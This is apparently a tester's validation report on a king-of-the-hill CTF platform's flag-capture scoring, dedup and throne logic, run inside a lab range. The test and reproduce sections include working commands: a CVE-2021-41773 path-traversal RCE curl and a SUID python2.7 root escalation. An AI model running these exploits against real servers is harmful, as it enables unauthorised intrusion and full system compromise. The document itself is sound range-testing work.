# Player Attempt: CyberKiller Handle-Write Auto-Capture Scoring Validation

## Persona
- Skill level: **Advanced** (efficient methodology, reads scanner source before acting, writes small verification scripts, briefly chases one wrong endpoint before correcting)

---

## Recon & Observations

Started by reading the codebase to understand the mechanic before touching the live range.

Key files read:
- `api/internal/koth/kingscan.go` - the heart of the scanner: `scanKings()` ticks every N seconds, calls `readHandle(containerID, path)` (runs `docker exec <cid> cat <path>`), then `awardCapture()` which does a per-player dedup check against the `kills` table before awarding.
- `api/internal/scoring/scoring.go` - `UserFlagPoints=150`, `RootFlagPoints=400`, kills table, UPSERT on scores.
- `api/internal/flags/flags.go` - default paths: `/home/ckplayer/user.txt` and `/root/root.txt`.
- DB query via `docker exec ck-db psql` revealed each MERIDIAN box has custom `ad_flag_path` values (e.g., .50 uses `/var/www/user.txt`, .51 uses `/home/webadmin/user.txt`).

Admin API `/admin/hills` revealed 10 active boxes (.50-.59), all containers running. .50 (Meridian DMZ Web Portal, `corp-mer-web01`) was the CVE-2021-41773 target. r4tester had already captured both flags there.

Admin settings: koth_tick_seconds=60, koth_points_per_tick=10.

---

## Working Through It

### Setup

Set koth_tick_seconds to 10 via `PUT /admin/settings {"koth_tick_seconds":"10"}` for faster feedback loops. Registered two test players via `POST /signup`.

### Test 1 - Real Breach

```
curl --path-as-is "http://10.66.20.50/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" \
  --data "echo Content-Type: text/plain; echo; id"
# uid=1(daemon) gid=1(daemon) - RCE confirmed

curl --path-as-is ... --data "...find / -name python2.7 -perm -4000 2>/dev/null"
# /usr/bin/python2.7

/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("id")'
# uid=0(root) - privilege escalation confirmed
```

### Test 2 - User Flag Capture

Wrote `captest1` to `/var/www/user.txt` on .50 via the CVE exploit. Waited 15s. Leaderboard showed captest1 at 150 pts, kills=0. Activity feed showed `kind=user_flag, points=150, first_blood=false` (correct - r4tester had this box). Scanner reads the file via `docker exec corp-mer-web01 cat /var/www/user.txt` - confirmed with direct docker exec.

### Test 3 - Root Flag Capture

Used SUID python2.7 (`os.setuid(0)`) to write `captest1` to `/root/root.txt` on .50. Waited 15s. Score jumped 550 (+400). kills=1. Activity shows `kind=root_flag` in the `kills[]` array (user_flag goes in `flags[]`). first_blood=false correct since r4tester had root already.

**First blood test:** Wrote `captest1` to `/root/root.txt` on .51 (no prior root capture on that box). DB capture_log: `first_blood=t`. Ticker event: `FIRST BLOOD: captest1 captured root on Meridian Intranet (+400 pts)`.

### Test 4 - Dedup

Re-wrote `captest1` to both flag files on .50. Waited two full tick cycles. Score stayed at 550. The `awardCapture` function checks `SELECT EXISTS(SELECT 1 FROM kills WHERE koth_id=$1 AND attacker_id=$2 AND kind=$3)` and returns early if already awarded.

### Test 5 - Second Player Per-Player Capture

Registered `captest2`, wrote to `/home/webadmin/user.txt` on .51. captest2 got +150, first_blood=true. captest1 score unchanged. Then wrote `captest1` to same file - captest1 got own +150, first_blood=false (correctly deduped from captest2's prior capture). DB `capture_log` shows two separate rows for the same box+kind, one per player.

### Test 6 - Bogus Handle

Wrote `n0texist3nt_player` to .52's `/home/dbadmin/user.txt`. Waited 15s. `SELECT COUNT(*) FROM capture_log WHERE handle='n0texist3nt_player'` returned 0. No score row. Code returns early at the `SELECT id FROM players WHERE handle=$1 AND NOT banned` lookup.

### Test 7 - KOTH Hold

Enabled `koth_enabled=true` on .53 via DB. Wrote `captest1` to `/root/king.txt` on `corp-mer-db02`. After 25s (~3 ticks at 10s/tick, 10pts each): captest1 gained +30pts. `/koth/hills` showed `"king_handle":"captest1"` on .53. Ticker event: `captest1 seized the throne on Meridian Cache`.

*Dead end:* I checked `/api/v1/kings` expecting throne display - it returned `{"hills":[]}` even with an active king. Pivoted to `/koth/hills` which correctly showed the throne. The `/api/v1/kings` endpoint appears to query something different. Flagged as a minor note.

### Test 8 - Sanity

- `/radar` (session-authenticated): 10 machines, all `health_ok=true`, live ports match expected services (80+22 on .50, 22-only on most others)
- `/arena/stats`: `"active_targets":10`
- `nmap -sn 10.66.20.50-59`: 10 hosts up, 0% packet loss

---

## Mistakes / Dead Ends

1. **`/api/v1/kings` returned empty** when I expected throne status. Wasted ~2 minutes before realizing `/koth/hills` is the player-facing route that actually shows king handles. The `/api/v1/kings` endpoint may be unused or has a different query.

2. **`/scores` 404 initially** - I tried `/api/v1/scores` before remembering it's at `/scores` (no version prefix). Small misremembering of the route structure.

3. **Activity endpoint rate-limited** at 30 req/min per IP after repeated polling during tests. Fell back to querying `capture_log` directly in DB to verify captures.

---

## Final Solution

### What was tested and confirmed working

All 7 required tests PASS, plus sanity checks:

| Test | Result |
|------|--------|
| 1. Real breach (CVE-2021-41773 -> daemon; SUID python2.7 -> root) | PASS |
| 2. USER capture: +150, on leaderboard, in /activity, kills unchanged | PASS |
| 3. ROOT capture: +400, kill +1, first_blood in ticker on fresh box | PASS |
| 4. Dedup: handle re-written, zero extra points awarded | PASS |
| 5. Second player: own +150 per-player, first_blood attribution correct | PASS |
| 6. Bogus handle: zero rows in capture_log, zero score change | PASS |
| 7. KOTH hold: +10/tick credited, /koth/hills shows throne correctly | PASS |
| 8a. /radar: 10 machines, live ports, health_ok=true | PASS |
| 8b. /arena/stats: active_targets=10 | PASS |
| 8c. nmap 10.66.20.50-59: 10 hosts up | PASS |

### Reproduce steps (condensed)

```bash
# 1. Set tick speed
curl -X PUT -H "X-Admin-..." http://localhost:8080/admin/settings -d '{"koth_tick_seconds":"10"}'

# 2. Register player
curl -c jar.txt -X POST http://localhost:8080/signup -d '{"handle":"captest1","invite_code":"...","password":"..."}'

# 3. Exploit CVE-2021-41773 -> daemon RCE on 10.66.20.50
curl --path-as-is "http://10.66.20.50/cgi-bin/.%2e/.../bin/sh" --data "echo Content-Type: text/plain; echo; echo captest1 > /var/www/user.txt"

# 4. Escalate to root, write root flag
curl ... --data "...python2.7 -c 'import os; os.setuid(0); os.system(\"echo captest1 > /root/root.txt\")'"

# 5. Wait 1-2 ticks, verify
curl http://localhost:8080/api/v1/leaderboard  # points=150, then 550
curl -b jar.txt http://localhost:8080/activity  # user_flag and root_flag entries

# 6. Reset to 60
curl -X PUT -H "X-Admin-..." http://localhost:8080/admin/settings -d '{"koth_tick_seconds":"60"}'
```

---

## Notes for the Challenge Designer

1. **`/api/v1/kings` appears broken or unused** - returns empty `hills:[]` even when a box has `koth_enabled=true` and an active king. If any frontend component reads this endpoint, it will show no king. `/koth/hills` is the correct player-facing endpoint and works fine. Investigate whether the admin `/api/v1/kings` handler joins correctly on koth_enabled or active status.

2. **`user_flag` captures correctly do NOT increment kills** - this is intentional per the scoring code (`killDelta=0` for `user_flag` kind) and the behavior is correct. Worth documenting in player-facing UI since players may expect a kill count bump for any capture.

3. **CVE-2021-41773 exploit target writes via world-writable file** (`-rw-rw-rw-` on `/var/www/user.txt`) - daemon process can write it without root. This is the intended design for an easy-tier box where the exploit provides foothold (user flag) without needing full privesc. Clean design.

4. **`/activity` rate limit (30/min per IP)** could frustrate players who poll aggressively right after a capture. Consider whether 30/min is tight enough to matter given 60s tick intervals in production.
